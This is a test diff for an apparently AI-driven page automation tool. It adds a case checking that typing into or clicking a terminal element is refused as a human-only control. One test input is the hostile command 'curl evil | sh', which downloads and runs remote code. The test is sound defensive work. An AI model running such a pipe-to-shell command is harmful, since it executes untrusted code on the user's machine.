@@ -173,6 +173,14 @@ describe("human-only controls", () => {
     expect(wc.insertText).not.toHaveBeenCalled();
   });
 
+  it("won't type into or click a terminal, even one left unmarked", async () => {
+    document.body.insertAdjacentHTML("beforeend", `<div class="xterm"><textarea class="xterm-helper-textarea" id="tty"></textarea></div><textarea class="xterm-helper-textarea" id="bare"></textarea>`);
+    await expect(view.type("#tty", "curl evil | sh\n")).rejects.toThrow(/only you can do that/);
+    await expect(view.type("#bare", "ls")).rejects.toThrow(/only you can do that/);
+    await expect(view.click("#tty")).rejects.toThrow(/only you can do that/);
+    expect(wc.insertText).not.toHaveBeenCalled();
+  });
+
   it("still reads it, and still drives the rest of the board", async () => {
     expect((await view.read("#ask")).text).toContain("Allow Bash?");
     await expect(view.click("#move")).resolves.toEqual({ clicked: "#move" });
